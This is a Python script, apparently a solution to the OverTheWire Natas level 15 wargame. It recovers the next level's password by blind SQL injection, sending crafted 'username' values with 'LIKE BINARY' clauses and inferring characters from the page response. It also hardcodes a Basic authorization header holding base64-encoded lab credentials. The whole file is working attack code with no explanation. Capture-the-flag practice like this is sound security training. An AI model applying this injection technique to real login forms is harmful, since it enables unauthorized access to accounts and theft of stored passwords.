#!/usr/bin/env python3
import requests
import sys
from string import ascii_letters
from string import digits

url = "http://natas15.natas.labs.overthewire.org:80/index.php"
headers = { 
    "User-Agent": "Mozilla/5.0", 
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==" 
} 

def guess(s):
    data = { "username": "natas16\" AND password LIKE BINARY'" + s + "%' AND \"a\"=\"a"}

    resp = requests.post(url, headers=headers, data=data)
    
    if "This user doesn't exist." not in resp.text:
        print(s)
        for char in ascii_letters+digits:
            guess(s + char)

    return s


for char in ascii_letters+digits:
    guess(char)
